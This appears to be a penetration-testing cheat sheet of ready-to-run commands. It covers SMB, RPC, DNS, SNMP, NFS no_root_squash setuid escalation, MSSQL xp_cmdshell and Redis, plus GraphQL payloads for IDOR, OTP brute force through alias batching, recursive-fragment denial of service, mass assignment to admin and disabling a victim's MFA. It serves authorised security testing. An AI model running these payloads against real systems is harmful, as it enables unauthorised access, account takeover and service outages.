SMB (139/445) &amp; RPC (135) DNS (53) &amp; SNMP (161/UDP) NFS (2049) <code>no_root_squash</code> Privesc MSSQL (1433) &amp; Redis (6379) <pre><code># Check SMB signing status, OS version, and enumerate shares with Null Session &amp; Guest
nxc smb &lt;TARGET_IP&gt; -u '' -p '' --shares
nxc smb &lt;TARGET_IP&gt; -u 'guest' -p '' --shares
# Recursively spider readable SMB shares for credentials &amp; config files
nxc smb &lt;TARGET_IP&gt; -u '&lt;USER&gt;' -p 'Password123!' -M spider_plus
# Enumerate users &amp; RID cycling via rpcclient / impacket-lookupsid
rpcclient -U "" -N &lt;TARGET_IP&gt; -c "enumdomusers; querydispinfo"
impacket-lookupsid '&lt;DOMAIN&gt;/&lt;USER&gt;:Password123!@&lt;TARGET_IP&gt;'
</code></pre> <pre><code># Attempt DNS Zone Transfer (AXFR) against target DNS server
dig axfr @&lt;TARGET_IP&gt; &lt;DOMAIN&gt;
fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;TARGET_IP&gt;
# Walk full SNMP MIB tree and extract running processes (often leaks CLI passwords!)
snmpwalk -v2c -c public &lt;TARGET_IP&gt; 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -v2c -c public &lt;TARGET_IP&gt; NET-SNMP-EXTEND-MIB::nsExtendObjects
braa public@&lt;TARGET_IP&gt;:1.3.6.*
</code></pre> <pre><code># List exported NFS paths before mounting anything.
showmount -e &lt;TARGET_IP&gt;

# Mount the approved test export on the assessment host.
sudo mkdir -p /mnt/nfs_target
sudo mount -t nfs &lt;TARGET_IP&gt;:/shared /mnt/nfs_target -o nolock
</code></pre> <p>A <code>no_root_squash</code> export means root on the client can create root-owned files on the share. Prove the permission with a lab marker, not an interactive backdoor:</p> <pre><code>/* Lab proof: record the effective identity when the target executes it. */
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main(void) {
    FILE *proof = fopen("/tmp/nfs-identity-proof", "w");
    if (proof == NULL) return 1;
    fprintf(proof, "uid=%d\\n", geteuid());
    fclose(proof);
    return 0;
}
</code></pre> <pre><code># Save the C proof as /mnt/nfs_target/nfs-proof.c, then compile it on the
# mounted share. The target must execute it for the result to mean anything.
sudo gcc /mnt/nfs_target/nfs-proof.c -o /mnt/nfs_target/nfs-proof
sudo chmod +s /mnt/nfs_target/nfs-proof

# After the approved lab execution, remove the binary and marker.
sudo rm -f /mnt/nfs_target/nfs-proof /mnt/nfs_target/nfs-proof.c
</code></pre> <pre><code># Connect to MSSQL with the approved test account.
impacket-mssqlclient '&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;TEST_PASSWORD&gt;@&lt;TARGET_IP&gt;' -windows-auth
</code></pre> <p>Commands at the <code>SQL&gt;</code> prompt are not shell commands; keep them in a SQL block:</p> <pre><code>-- Confirm the current SQL identity before testing permissions.
SELECT SYSTEM_USER, USER_NAME();

-- Only test command execution when the scope explicitly allows it.
EXEC xp_cmdshell 'whoami';

-- Enumerate linked servers without changing their configuration.
EXEC sp_linkedservers;
</code></pre> <p>Redis is stateful. First read its identity and configuration; do not flush a database or write an SSH key unless the engagement explicitly calls for a disposable lab.</p> <pre><code># Read-only Redis checks.
redis-cli -h &lt;TARGET_IP&gt; PING
redis-cli -h &lt;TARGET_IP&gt; INFO server
redis-cli -h &lt;TARGET_IP&gt; CONFIG GET dir
redis-cli -h &lt;TARGET_IP&gt; CONFIG GET dbfilename
</code></pre>

Introspection &amp; Schema Recovery GraphQL Attack Patterns <pre><code># Full introspection query (often disabled — try these alternatives)
{ __schema { types { name fields { name type { name kind ofType { name } } } } } }
# If introspection is blocked:
# 1. Field suggestion errors: send "usr" -&gt; "Did you mean 'user'?"
# 2. GraphQL Voyager / clairvoyance for schema recovery via suggestions
# 3. Check for a public .graphql schema file in the repo / source maps
# 4. Try GET-based introspection on /graphql?query={__schema{...}}
</code></pre> <pre><code># Automated schema dump &amp; analysis
python3 graphql-cop.py -t https://&lt;DOMAIN&gt;/graphql
clairvoyance -o schema.json https://&lt;DOMAIN&gt;/graphql
# Then explore with graphql-voyager / Altair / GraphiQL
</code></pre> <pre><code># 1. IDOR via node() global object lookup
{ node(id: "VXNlcjoxMzM3") { ... on User { email passwordHash role } } }
# base64 "User:1337" -&gt; decode, change ID, re-encode
# 2. Alias batching -&gt; brute force OTP/2FA in ONE request (bypasses rate limits!)
mutation {
  a1: verifyOtp(otp: "000000") { token }
  a2: verifyOtp(otp: "000001") { token }
  a3: verifyOtp(otp: "000002") { token }
  # ... up to 1000 aliases in a single HTTP request
}
# 3. Query batching (array of operations) for rate-limit bypass
[{"query":"mutation{redeem(code:\"X\")}"},{"query":"mutation{redeem(code:\"X\")}"}]
# 4. Deep recursion / circular fragments -&gt; DoS
fragment A on User { friends { ...B } } fragment B on User { friends { ...A } }
# 5. Field stuffing for hidden fields
{ user(id: 1) { id email role isAdmin passwordHash apiKey mfaSecret internalNotes } }
# 6. Mutation-based mass assignment
mutation { updateUser(input: {id: 1, role: ADMIN, isVerified: true}) { user { id role } } }
# 7. Disable 2FA / change email via mutations that are not mirrored in REST
mutation { disableMfa(userId: &lt;VICTIM_ID&gt;) { success } }
</code></pre>
